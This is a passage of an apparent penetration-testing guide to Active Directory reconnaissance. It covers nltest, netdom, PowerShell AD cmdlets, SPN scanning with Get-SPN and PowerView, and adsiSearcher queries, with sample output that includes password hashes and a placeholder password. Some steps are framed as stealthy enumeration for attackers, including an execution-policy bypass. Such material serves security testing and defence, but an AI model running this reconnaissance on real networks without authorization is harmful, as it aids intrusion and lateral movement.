<p><a class="reference external" href="http://jxplorer.org/">JXplorer</a> is a cross platform LDAP browser and editor. It is a standards compliant general purpose LDAP client that can be used to search, read and edit any standard LDAP directory, or any directory service with an LDAP or DSML interface.</p>
</div>
<div class="section" id="remote-server-administration-tools">
<h3>Remote Server Administration Tools<a class="headerlink" href="#remote-server-administration-tools" title="Permalink to this headline">¶</a></h3>
<p>Active Directory Domain Services (AD DS) Tools and Active Directory Lightweight Directory Services (AD LDS) Tools includes Active Directory Administrative Center; Active Directory Domains and Trusts; Active Directory Sites and Services; Active Directory Users and Computers; ADSI Edit; DCPromo.exe; LDP.exe; NetDom.exe; NTDSUtil.exe; RepAdmin.exe; Active Directory module for Windows PowerShell; DCDiag.exe; DSACLs.exe; DSAdd.exe; DSDBUtil.exe; DSMgmt.exe; DSMod.exe; DSMove.exe; DSQuery.exe; DSRm.exe; GPFixup.exe; KSetup.exe; KtPass.exe; NlTest.exe; NSLookup.exe; W32tm.exe.</p>
<p>Active Directory Administrative Center; Active Directory Domains and Trusts; Active Directory Sites and Services; Active Directory Users and Computers; ADSI Edit;  are GUI tools. These can be installed by installing <a class="reference external" href="https://support.microsoft.com/en-in/help/2693643/remote-server-administration-tools-rsat-for-windows-operating-systems">Remote Server Administration Tools</a></p>
</div>
<div class="section" id="nltest">
<h3>nltest<a class="headerlink" href="#nltest" title="Permalink to this headline">¶</a></h3>
<p><a class="reference external" href="https://technet.microsoft.com/en-us/library/cc731935(v=ws.11).aspx">Nltest</a> is a command-line tool to perform network administrative tasks. We could figure out the Domain Controllers/ Domain Trusts using it. It is built into Windows Server 2008 and Windows Server 2008 R2. It is available if you have the AD DS or the AD LDS server role installed. It is also available if you install the Active Directory Domain Services Tools that are part of the Remote Server Administration Tools (RSAT).</p>
<div class="section" id="id5">
<h4>Usage<a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>nltest /?
Usage: nltest [/OPTIONS]


   /SERVER:&lt;ServerName&gt; - Specify &lt;ServerName&gt;

   /QUERY - Query &lt;ServerName&gt; netlogon service
   /DCLIST:&lt;DomainName&gt; - Get list of DC&#39;s for &lt;DomainName&gt;
   /DCNAME:&lt;DomainName&gt; - Get the PDC name for &lt;DomainName&gt;
   /DSGETDC:&lt;DomainName&gt; - Call DsGetDcName /PDC /DS /DSP /GC /KDC /TIMESERV /GTIMESERV /WS /NETBIOS /DNS /IP /FORCE /WRITABLE /AVOIDSELF /LDAPONLY /BACKG /DS_6
       /TRY_NEXT_CLOSEST_SITE /SITE:&lt;SiteName&gt; /ACCOUNT:&lt;AccountName&gt; /RET_DNS /RET_NETBIOS
   /DNSGETDC:&lt;DomainName&gt; - Call DsGetDcOpen/Next/Close /PDC /GC /KDC /WRITABLE /LDAPONLY /FORCE /SITESPEC
   /DSGETFTI:&lt;DomainName&gt; - Call DsGetForestTrustInformation /UPDATE_TDO
   /DSGETSITE - Call DsGetSiteName
   /DSGETSITECOV - Call DsGetDcSiteCoverage
   /DSADDRESSTOSITE:[MachineName] - Call DsAddressToSiteNamesEx        /ADDRESSES:&lt;Address1,Address2,...&gt;
   /PARENTDOMAIN - Get the name of the parent domain of this machine
   /WHOWILL:&lt;Domain&gt;* &lt;User&gt; [&lt;Iteration&gt;] - See if &lt;Domain&gt; will log on &lt;User&gt;
   /FINDUSER:&lt;User&gt; - See which trusted domain will log on &lt;User&gt;
   /USER:&lt;UserName&gt; - Query User info on &lt;ServerName&gt;
   /TIME:&lt;Hex LSL&gt; &lt;Hex MSL&gt; - Convert NT GMT time to ascii
   /LOGON_QUERY - Query number of cumulative logon attempts
   /DOMAIN_TRUSTS - Query domain trusts on &lt;ServerName&gt;
       /PRIMARY /FOREST /DIRECT_OUT /DIRECT_IN /ALL_TRUSTS /V
</pre></div>
</div>
<p><strong>Examples</strong></p>
</div>
<div class="section" id="verify-domain-controllers-in-a-domain">
<h4>Verify domain controllers in a domain<a class="headerlink" href="#verify-domain-controllers-in-a-domain" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>nltest /dclist:xxx.example.net
Get list of DCs in domain &#39;xxx.example.net&#39; from &#39;\\ABCDEFG.xxx.example.net&#39;.
      ABCDEFG1.xxx.example.net        [DS] Site: XX-SriLanka
      ABCDEFG2.xxx.example.net        [DS] Site: XX-India
      ABCDEFG5.xxx.example.net [PDC]  [DS] Site: XX-Bangladesh
The command completed successfully
</pre></div>
</div>
</div>
<div class="section" id="advanced-information-about-users">
<h4>Advanced information about users<a class="headerlink" href="#advanced-information-about-users" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>nltest /user:&quot;TestAdmin&quot;
User: User1
Rid: 0x3eb
Version: 0x10002
LastLogon: 2ee61c9a 01c0e947 = 5/30/2001 13:29:10
PasswordLastSet: 9dad5428 01c0e577 = 5/25/2001 17:05:47
AccountExpires: ffffffff 7fffffff = 9/13/30828 19:48:05
PrimaryGroupId: 0x201
UserAccountControl: 0x210
CountryCode: 0x0
CodePage: 0x0
BadPasswordCount: 0x0
LogonCount: 0x33
AdminCount: 0x1
SecurityDescriptor: 80140001 0000009c 000000ac 00000014 00000044 00300002 000000
02 0014c002 01050045 00000101 01000000 00000000 0014c002 000f07ff 00000101 05000
000 00000007 00580012 00000003 00240000 00020044 00000501 05000000 00000015 22cd
b7b4 7112b3f1 2b3be507 000003eb 00180000 000f07ff 00000201 05000000 00000020 000
00220 00140000 0002035b 00000101 01000000 00000000 00000201 05000000 00000020 00
000220 00000201 05000000 00000020 00000220
 AccountName: User1
Groups: 00000201 00000007
LmOwfPassword: fb890c9c 5c7e7e09 ee58593b d959c681
NtOwfPassword: d82759cc 81a342ac df600c37 4e58a478
NtPasswordHistory: 00011001
LmPasswordHistory: 00010011
The command completed successfully
</pre></div>
</div>
</div>
<div class="section" id="determine-the-pdc-emulator-for-a-domain">
<h4>Determine the PDC emulator for a domain<a class="headerlink" href="#determine-the-pdc-emulator-for-a-domain" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>nltest /dcname:fourthcoffee
PDC for Domain fourthcoffee is \\fourthcoffee-dc-01
The command completed successfully
</pre></div>
</div>
</div>
<div class="section" id="show-trust-relationships-for-a-domain">
<h4>Show trust relationships for a domain<a class="headerlink" href="#show-trust-relationships-for-a-domain" title="Permalink to this headline">¶</a></h4>
<p>Returns a list of trusted domains. /Primary /Forest /Direct_Out /Direct_In /All_Trusts /v.</p>
<p>The following list shows the values that you can use to filter the list of domains.</p>
<ul class="simple">
<li>/Primary: Returns only the domain to which the computer account belongs.</li>
<li>/Forest: Returns only those domains that are in the same forest as the primary domain.</li>
<li>/Direct_Out: Returns only the domains that are explicitly trusted with the primary domain.</li>
<li>/Direct_In: Returns only the domains that explicitly trust the primary domain.</li>
<li>/All_Trusts: Returns all trusted domains.</li>
<li>/v: Displays verbose output, including any domain SIDs and GUIDs that are available.</li>
</ul>
<div class="highlight-None"><div class="highlight"><pre><span></span>nltest /domain_trusts

List of domain trusts:
   0: ABC abc.example.net (NT 5) (Forest: 17) (Direct Outbound) (Direct Inbound)
   1: DEF def.example.net (NT 5) (Forest: 17) (Direct Outbound) (Direct Inbound)
   2: IJK IJK.NET (NT 5) (Direct Inbound) ( Attr: 0x8 )
   3: LMN LMH.net (NT 5) (Direct Outbound) ( Attr: 0x18 )
   4: APP app.example.net (NT 5) (Forest: 17) (Direct Outbound) (Direct Inbound) ( Attr: 0x20 )
</pre></div>
</div>
<p>Thanks to <a class="reference external" href="https://twitter.com/tanoybose">Tanoy Bose</a> for informing me about this. Cheers Bose.</p>
</div>
</div>
<div class="section" id="netdom">
<h3>netdom<a class="headerlink" href="#netdom" title="Permalink to this headline">¶</a></h3>
<p>netdom: netdom is a command-line tool that is built into Windows Server 2008 and Windows Server 2008 R2. It is available if you have the Active Directory Domain Services (AD DS) server role installed. It is also available if you install the Active Directory Domain Services Tools that are part of the Remote Server Administration Tools (RSAT). More information available at <a class="reference external" href="https://technet.microsoft.com/en-us/library/cc835089(v=ws.11).aspx">Netdom query</a>.</p>
<div class="section" id="id6">
<h4>Usage<a class="headerlink" href="#id6" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>netdom query {/d: | /domain:}&lt;Domain&gt; [{/s: | /server:}&lt;Server&gt;] [{/ud: | /userd:}[&lt;Domain&gt;\]&lt;User&gt; {/pd: | /passwordd}{&lt;Password&gt;|*}] [/verify] [/reset] [/direct] {WORKSTATION|SERVER|DC|OU|PDC|FSMO|TRUST} [{/help | /?}]

Specifies the type of list to generate. The following list shows the possible objects:
WORKSTATION: Queries the domain for the list of workstations.
SERVER: Queries the domain for the list of servers.
DC   : Queries the domain for the list of domain controllers.
OU   : Queries the domain for the list of OUs under which the user that you specify can create a computer object.
PDC  : Queries the domain for the current primary domain controller.
FSMO : Queries the domain for the current list of operations master role holders. These role holders are also known as flexible single master operations (FSMO).
TRUST: Queries the domain for the list of its trusts.
</pre></div>
</div>
<p><strong>Examples</strong></p>
</div>
<div class="section" id="dc">
<h4>DC<a class="headerlink" href="#dc" title="Permalink to this headline">¶</a></h4>
<p>Queries the domain for the list of workstations:</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\&gt; netdom query /domain example.net DC
List of domain controllers with accounts in the domain:

xxxxDC12
xxxxDC11
xxxxDC04
xxxxDC03
The command completed successfully.
</pre></div>
</div>
</div>
<div class="section" id="pdc">
<h4>PDC<a class="headerlink" href="#pdc" title="Permalink to this headline">¶</a></h4>
<p>Queries the domain for the current primary domain controller</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\&gt; netdom query /domain example.net PDC
Primary domain controller for the domain:

xxxxDC03.example.net
The command completed successfully.
</pre></div>
</div>
</div>
<div class="section" id="fsmo">
<h4>FSMO<a class="headerlink" href="#fsmo" title="Permalink to this headline">¶</a></h4>
<p>Queries the domain for the current list of operations master role holders.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\&gt; netdom query /domain example.net FSMO
Schema master               xxxxDC03.example.net
Domain naming master        xxxxDC03.example.net
PDC                         xxxxDC03.example.net
RID pool manager            xxxxDC03.example.net
Infrastructure master       xxxxDC03.example.net
The command completed successfully.
</pre></div>
</div>
</div>
<div class="section" id="trust">
<h4>TRUST<a class="headerlink" href="#trust" title="Permalink to this headline">¶</a></h4>
<p>Queries the domain for the list of its trusts</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\&gt; netdom query /domain example.net TRUST
Direction Trusted\Trusting domain      Trust type
========= =======================      ==========

&lt;-&gt;       xxxx.xxxxxx.net              Direct
&lt;-&gt;       xxxx.example.net             Direct
&lt;-&gt;       XX.XXXxXX.NET                Direct
</pre></div>
</div>
</div>
<div class="section" id="ou">
<h4>OU<a class="headerlink" href="#ou" title="Permalink to this headline">¶</a></h4>
<p>Queries the domain for the list of OUs under which the user that you specify can create a computer object.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\&gt; netdom query /domain abc.example.net OU
List of Organizational Units within which the specified user can create a
machine account:

OU=Domain Controllers,DC=abc,DC=example,DC=net
OU=ABC-Admin,DC=abc,DC=example,DC=net
OU=ServiceAccounts,OU=ABC-Admin,DC=abc,DC=example,DC=net
OU=Users,OU=ABC-Admin,DC=abc,DC=example,DC=net
OU=Groups,OU=ABC-Admin,DC=abc,DC=example,DC=net
OU=Service Accounts,DC=abc,DC=example,DC=net
OU=Servers,OU=ABC-Admin,DC=abc,DC=example,DC=net
DC=abc,DC=example,DC=net
The command completed successfully.
</pre></div>
</div>
</div>
<div class="section" id="server-workstation">
<h4>SERVER/ WORKSTATION<a class="headerlink" href="#server-workstation" title="Permalink to this headline">¶</a></h4>
<p>Queries the domain for the list of servers/ workstations</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\&gt; netdom query /domain abc.example.net WORKSTATION
List of workstations with accounts in the domain:

ABCDC02      ( Workstation or Server )
ABCDC01      ( Workstation or Server )
ABCDC03      ( Workstation or Server )
ABCDC04      ( Workstation or Server )
BSKMACDB62   ( Workstation or Server )

The command completed successfully.

PS C:\&gt;
</pre></div>
</div>
</div>
</div>
<div class="section" id="microsoft-active-directory-topology-diagrammer">
<h3>Microsoft Active Directory Topology Diagrammer<a class="headerlink" href="#microsoft-active-directory-topology-diagrammer" title="Permalink to this headline">¶</a></h3>
<p>The <a class="reference external" href="https://www.microsoft.com/en-in/download/details.aspx?id=13380">Microsoft Active Directory Topology Diagrammer</a> reads an Active Directory configuration using LDAP, and then automatically generates a Visio diagram of your Active Directory and /or your Exchange Server topology. The diagrams may include domains, sites, servers, organizational units, DFS-R, administrative groups, routing groups and connectors and can be changed manually in Visio if needed.</p>
</div>
<div class="section" id="ad-reconnaissance-with-powershell">
<h3>AD Reconnaissance with PowerShell<a class="headerlink" href="#ad-reconnaissance-with-powershell" title="Permalink to this headline">¶</a></h3>
<p>Sean Metcalf has written an awesome blog regarding the <a class="reference external" href="https://adsecurity.org/?p=2535">Active Directory Recon without Admin Rights</a> Most of the below stuff has been directly taken from his blog.</p>
<p>The enumeration of the active directory can also be carried forward using the normal domain user account. After gathering the domain user credentials launch the powershell by the following command on the command prompt.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>C:\&gt; Powershell -nop -exec bypass -noexit
</pre></div>
</div>
<div class="section" id="forest-information">
<h4>Forest Information<a class="headerlink" href="#forest-information" title="Permalink to this headline">¶</a></h4>
<p>The current forest information can be gathered by using the following powershell code</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\&gt; [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

Name                  : ABC.com
Sites                 : {Default-First-Site-Name}
Domains               : {ABC.com}
GlobalCatalogs        : {WIN-OK0HIC2UCIH.ABC.com}
ApplicationPartitions : {DC=DomainDnsZones,DC=ABC,DC=com, DC=ForestDnsZones,DC=
                        ABC,DC=com}
ForestMode            : Windows2008R2Forest
RootDomain            : ABC.com
Schema                : CN=Schema,CN=Configuration,DC=ABC,DC=com
SchemaRoleOwner       : WIN-OK0HIC2UCIH.ABC.com
NamingRoleOwner       : WIN-OK0HIC2UCIH.ABC.com
</pre></div>
</div>
</div>
<div class="section" id="domain-information">
<h4>Domain Information<a class="headerlink" href="#domain-information" title="Permalink to this headline">¶</a></h4>
<p>The current domain information to which the domain user is a part can be easily gathered by issuing the following powershell code</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\&gt; [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

Forest                  : ABC.com
DomainControllers       : {WIN-OK0HIC2UCIH.ABC.com}
Children                : {}
DomainMode              : Windows2008R2Domain
Parent                  :
PdcRoleOwner            : WIN-OK0HIC2UCIH.ABC.com
RidRoleOwner            : WIN-OK0HIC2UCIH.ABC.com
InfrastructureRoleOwner : WIN-OK0HIC2UCIH.ABC.com
Name                    : ABC.com
</pre></div>
</div>
</div>
<div class="section" id="forest-trusts">
<h4>Forest Trusts<a class="headerlink" href="#forest-trusts" title="Permalink to this headline">¶</a></h4>
<p>The trust between the present forests can be obtained by the following powershell code</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>$ForestRootDomain = ‘lab.adsecurity.org’
([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(‘Forest’, $ForestRootDomain)))).GetAllTrustRelationships()
</pre></div>
</div>
</div>
<div class="section" id="domain-trusts">
<h4>Domain Trusts<a class="headerlink" href="#domain-trusts" title="Permalink to this headline">¶</a></h4>
<p>The trusts relationship between the current domain and associated domain can be enumerated by the following</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\&gt; ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
</pre></div>
</div>
<p>By gathering this information, An attacker can determine the attack surface area by residing in current domain.</p>
</div>
<div class="section" id="forest-global-catalogs">
<h4>Forest Global Catalogs<a class="headerlink" href="#forest-global-catalogs" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\&gt; [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().GlobalCatalogs
</pre></div>
</div>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">Typically every DC is also a Global catalog</p>
</div>
</div>
<div class="section" id="enterprise-services-without-scanning-of-network">
<h4>Enterprise Services without scanning of Network<a class="headerlink" href="#enterprise-services-without-scanning-of-network" title="Permalink to this headline">¶</a></h4>
<p>The services offered by the particular can also be identified using a simple powershell code. This type of information gathering is a stealthy approach as the service scanning of network may sometimes trigger the alarm. This type of approach is carried out by scanning the SPN (Service Principal Names). The information related to RDP enabled workstations, WinRM Enabled, Exchange servers, SQL servers etc. can be enumerated.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\&gt; get-adcomputer -filter {ServicePrincipalName -like “*TERMSRV*”} -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,
PasswordLastSet,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation
</pre></div>
</div>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">Both the computers and users (Service accounts) are to be targeted in order to determine the Enterprise services.</p>
</div>
</div>
<div class="section" id="spn-scanning">
<h4>SPN-Scanning<a class="headerlink" href="#spn-scanning" title="Permalink to this headline">¶</a></h4>
<p>Microsoft states that  “A service principal name (SPN) is the name by which a client uniquely identifies an instance of a service.”
using the SPN scanning we identify the common servers such as IIS, SQL Server, and LDAP. Mostly, the convention of the SPN is formatted as SERVICE/HOST but sometimes the port no. associated is also given such as SERVICE/HOST:PORT.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>DNS/win2008k001.ABC.com   MSSQLSvc/win2008k002.ABC.com:1600
</pre></div>
</div>
<p>The above example shows that if the Domain Account is used to run the DNS and SQL services on ABC.com the SPN entries would be the same.
Here we can use <a class="reference external" href="http://www.joeware.net/freetools/tools/adfind/">ADFind.exe</a> to list all the SQL server instances registered on a domain by using the code</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>C: &gt;Adfind.exe -f &quot;ServicePrincipalName=MSSQLSvc*&quot;
</pre></div>
</div>
<p>we can also use setspn.exe (comes with the windows server 2008) can be used to lookup the SPNs for a particular user.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>C: &gt;setspn.exe -l &quot;UserName&quot;
</pre></div>
</div>
</div>
<div class="section" id="spn-scanning-using-powershell">
<h4>SPN Scanning using Powershell<a class="headerlink" href="#spn-scanning-using-powershell" title="Permalink to this headline">¶</a></h4>
<p>Scott Sutherland has written about SPN scanning techniques at <a class="reference external" href="https://blog.netspi.com/faster-domain-escalation-using-ldap/">Faster Domain Esclation using LDAP</a> .The <a class="reference external" href="https://github.com/nullbind/Powershellery/blob/master/Stable-ish/Get-SPN/Get-SPN.psm1">Get-SPN</a> Powershell module provides us to quickly search LDAP for accounts related to specific groups, users or SPN service name. Once Downloaded the script run the following command in a command prompt in order to install it for the current session.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>C:\&gt; Powershell -nop -exec bypass -noexit (change the directory pointing towards the downloaded location)
PS C:\&gt; Import-Module .\Get-SPN.psm1
</pre></div>
</div>
<p>Find All Servers where Domain Admins are Registered to Run Services. If we are using the Domain User or local system from a particular Domain computer use the following command</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>Get-SPN -type group -search &quot;Domain Admins&quot; -List yes | Format-Table -Autosize
</pre></div>
</div>
<p>for a non domain system with domain credentials we can use the command below</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>Get-SPN  -type group -search &quot;Domain Admins&quot; -List yes -DomainController 192.168.1.100 -Credential domainuser | Format-Table -Autosize
</pre></div>
</div>
</div>
<div class="section" id="find-all-registered-sql-servers-dcom-dnscache-etc">
<h4>Find all registered SQL Servers, Dcom, dnscache etc.<a class="headerlink" href="#find-all-registered-sql-servers-dcom-dnscache-etc" title="Permalink to this headline">¶</a></h4>
<p>for identifying the services using the Domain User or localsystem from a particular Domain computer use the following command</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>Get-SPN  -type service -search &quot;MSSQLSvc*&quot; -List yes | Format-Table -Autosize
</pre></div>
</div>
<p>for other than Servers, below is a list of standard SPN service names.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>alerter,appmgmt,browser,cifs,cisvc,clipsrv,dcom,dhcp,dmserver,dns,dnscache,eventlog,eventsystem,fax,
http,ias,iisadmin,messenger,msiserver,mcsvc,netdde,netddedsm,netlogon,netman,nmagent,oakley,plugplay,policyagent,
protectedstorage,rasman,remoteaccess,replicator,rpc,rpclocator,rpcss,rsvp,samss,scardsvr,scesrv,schedule,scm,seclogon,
snmp,spooler,tapisrv,time,trksvr,trkwks,ups,w3svc,wins,www
</pre></div>
</div>
<p>To find All the ServicePrincipalName Entries for Domain Users Matching String by executing the command as domain user or LocalSystem from a domain computer then you can use the command below.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>Get-SPN  -type user -search &quot;*svc*&quot; -List yes
</pre></div>
</div>
</div>
<div class="section" id="discovering-the-service-accounts">
<h4>Discovering the Service Accounts<a class="headerlink" href="#discovering-the-service-accounts" title="Permalink to this headline">¶</a></h4>
<p>By Doing an SPN Scan for user accounts with Service Principal Names the service Accounts and the server accounts used can be identified.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\&gt; get-aduser -filter {ServicePrincipalName -like “*”} -Properties PasswordLastSet,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation
</pre></div>
</div>
</div>
<div class="section" id="discovering-the-computers-and-domain-controllers-without-scanning-the-network">
<h4>Discovering the Computers and Domain Controllers without scanning the network<a class="headerlink" href="#discovering-the-computers-and-domain-controllers-without-scanning-the-network" title="Permalink to this headline">¶</a></h4>
<p>The information regarding the computer operating system, DNSHostName, LastLogon Date etc. can also be gathered. Since every computer joining the active directory has an associated computer account in AD. When the computer is joined, several attributes such as date created, Modified, OperatingSystemVersion etc. are associated with this computer object that are updated. Such information can also be further used for lateral movements.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\&gt; get-adcomputer -filter {PrimaryGroupID -eq “515”} -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,
Passwot,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation
</pre></div>
</div>
<p>The same information regarding the Domain Controllers can also be gathered by simply changing the PrimaryGroupID value to ‘516’. to obtain the details of all the computers in active directory by simply putting a wildcard mask in the filter parameter such as “-filter * “.</p>
</div>
<div class="section" id="identifying-the-admin-accounts">
<h4>Identifying the Admin Accounts<a class="headerlink" href="#identifying-the-admin-accounts" title="Permalink to this headline">¶</a></h4>
<p>The privileged accounts can be identified using two methods. The first one is by doing a detailed group enumeration, by doing this all members of the standard Active Directory admin groups: Domain Admins, Administrators, Enterprise Admins, etc. one such command is “Net Group “Domain Admins” /Domain” which will give us the list of Domain Administrators.</p>
<p>Another method is by identifying all accounts which have the attribute “AdminCount” set to 1. However, this may not be sometimes accurate since there may be accounts returned in this query which no longer have admin rights because these values aren’t automatically reset even if the accounts are disabled or no longer a part of Admins group.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\&gt; get-aduser -filter {AdminCount -eq 1} -Properties Name,AdminCount,ServicePrincipalName,PasswordLastSet,LastLogonDate,MemberOf
</pre></div>
</div>
<p>This query will give us the “AdminCount :1” which indicates that the account is privileged account.</p>
</div>
<div class="section" id="finding-the-admin-groups">
<h4>Finding the Admin Groups<a class="headerlink" href="#finding-the-admin-groups" title="Permalink to this headline">¶</a></h4>
<p>Most of the organizations follow a naming convention for the admin groups such as Domain Admins, Server Admins, Workstation Admins, Administrators etc. By Querying the Active Directory for groups with Admin as term we can identify the administrator groups.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\&gt; get-adgroup -filter {GroupCategory -eq ‘Security’ -AND Name -like “*admin*”}
</pre></div>
</div>
</div>
<div class="section" id="id8">
<h4>Domain Password Policy<a class="headerlink" href="#id8" title="Permalink to this headline">¶</a></h4>
<p>The Domain password policy can be easily gathered either by using Net Accounts or Get-ADDefaultPasswordPolicy.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>Get-ADDefaultDomainPasswordPolicy
Net Accounts
</pre></div>
</div>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">To use Get-ADDefaultPasswordPolicy PowerView.PS1 module is to be imported first.</p>
</div>
</div>
<div class="section" id="identifying-the-groups-with-local-admin-rights-to-windows-machines">
<h4>Identifying the Groups with Local Admin Rights to windows machines<a class="headerlink" href="#identifying-the-groups-with-local-admin-rights-to-windows-machines" title="Permalink to this headline">¶</a></h4>
<p>Using the Powerview.PS1 module we can easily identify the identify GPOs that include Restricted Groups.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\&gt; Get-NetGPOGroup
</pre></div>
</div>
<p>we can also check to what OUs the GPOs link using a PowerView cmdlet.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>get-netOU -guid “GPOName Obtained Above”
</pre></div>
</div>
<p>next to identify the workstations/servers in the OU</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>get-adcomputer -filter * -SearchBase “Result of the above”
</pre></div>
</div>
</div>
</div>
<div class="section" id="powershell-adsisearcher-type-accelerator">
<h3>PowerShell [adsiSearcher] Type Accelerator<a class="headerlink" href="#powershell-adsisearcher-type-accelerator" title="Permalink to this headline">¶</a></h3>
<p>If we have credentials of the user and a powershell prompt, we can utilize adsiSearcher to do the AD Enumeration</p>
<div class="section" id="define-username-password-domain-etc">
<h4>Define username, password, Domain, etc.<a class="headerlink" href="#define-username-password-domain-etc" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>$username = &#39;BITVIJAYS\LDAP&#39;
$password = &#39;PasswordForSearch!&#39;
$DomainControllerIpAddress = &#39;10.2.2.2&#39;
$LdapDn = &#39;DC=bitvjays,DC=local&#39;
</pre></div>
</div>
</div>
<div class="section" id="initialize-the-connection">
<h4>Initialize the connection<a class="headerlink" href="#initialize-the-connection" title="Permalink to this headline">¶</a></h4>
<p>When credentials are present and we are connecting using a non-domain machine, use below</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>$dn = New-Object System.DirectoryServices.DirectoryEntry (&quot;LDAP://$($DomainControllerIpAddress):389/$LdapDn&quot;,$username,$password)
$ds = New-object System.DirectoryServices.DirectorySearcher($dn)
</pre></div>
</div>
<p>When you are already connected to the domain machine</p>
<p>[adsisearcher]”” specifies a filter that has no characters in it. The good thing is that the searchroot is automatically set to the root of the current domain.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>$ds = [adsisearcher]&quot;&quot;
</pre></div>
</div>
</div>
<div class="section" id="finding-the-domain-name">
<h4>Finding the Domain Name<a class="headerlink" href="#finding-the-domain-name" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>$ds.SearchRoot
distinguishedName : {DC=bitvijays,DC=local}
Path : LDAP://DC=bitvijays,DC=local
</pre></div>
</div>
</div>
<div class="section" id="finding-the-computers">
<h4>Finding the Computers<a class="headerlink" href="#finding-the-computers" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS &gt; $ds.Filter =&quot;((objectCategory=computer))&quot;
PS &gt; $ds.FindAll() --- Provides all the objects in the AD for computers
PS &gt; $ds.FindOne() --- Provides one object in the AD for computers
</pre></div>
</div>
<p>Result</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>Path                                                                  Properties
----                                                                  ----------
LDAP://10.2.2.2:389/CN=DC,OU=Domain Controllers,DC=bitvijays,DC=local {ridsetreferences, logoncount, codepage, objec...
LDAP://10.2.2.2:389/CN=FILE,CN=Computers,DC=bitvijays,DC=local        {logoncount, codepage, objectcategory, iscriti...
</pre></div>
</div>
</div>
<div class="section" id="finding-the-users">
<h4>Finding the Users:<a class="headerlink" href="#finding-the-users" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS &gt; $ds.Filter =&quot;((objectCategory=user))&quot;
PS &gt; $ds.FindAll() --- Provides all the objects in the AD for users
</pre></div>
</div>
</div>
<div class="section" id="properties-of-the-object">
<h4>Properties of the object<a class="headerlink" href="#properties-of-the-object" title="Permalink to this headline">¶</a></h4>
<p>We can use</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>$ds.FindOne().properties
$ds.FindAll().properties
</pre></div>
</div>
<p>to find the properties of the object. Once the properties are found, we can search for any particular object based on regex.</p>
<p>Examples:</p>
<ul class="simple">
<li>Finding a particular user named Bob</li>
</ul>
<blockquote>
<div><p>Check the properties of the user</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>Properties of a user
PS &gt; $ds.findOne().properties

Name                           Value
----                           -----
objectcategory                 {CN=Person,CN=Schema,CN=Configuration,DC=bitvijays,DC=local}
name                           {Administrator}
cn                             {Administrator}
admincount                     {1}
samaccountname                 {Administrator}
</pre></div>
</div>
<p>Then particularly search for a user</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS &gt; $ds.Filter =&quot;((name=*Bob*))&quot;
PS &gt; $ds.Findall()

Path                                                                Properties
----                                                                ----------
LDAP://10.2.2.2:389/CN=Bobby John,OU=People,DC=bitvijays,DC=local {logoncount, codepage, objectcategory, descripti...
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>Finding all users of a particular group</li>
</ul>
<blockquote>
